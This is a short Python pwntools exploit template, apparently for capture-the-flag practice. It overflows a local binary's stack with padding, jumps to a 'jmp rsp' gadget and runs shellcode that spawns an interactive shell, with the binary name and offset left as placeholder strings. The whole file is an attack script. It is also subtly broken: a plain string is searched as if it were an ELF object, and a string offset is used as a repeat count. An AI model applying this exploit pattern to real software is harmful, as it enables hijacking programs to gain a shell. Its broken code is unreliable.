from pwn import *

binary = "binary name"
jmp_rsp = next(binary.search(asm('jmp rsp')))
offset = "your offset"

payload = flat(
    'A' * offset,              
    jmp_rsp,             
    asm(shellcraft.sh())
)

p = process(binary)

p.send(payload)
p.interactive()
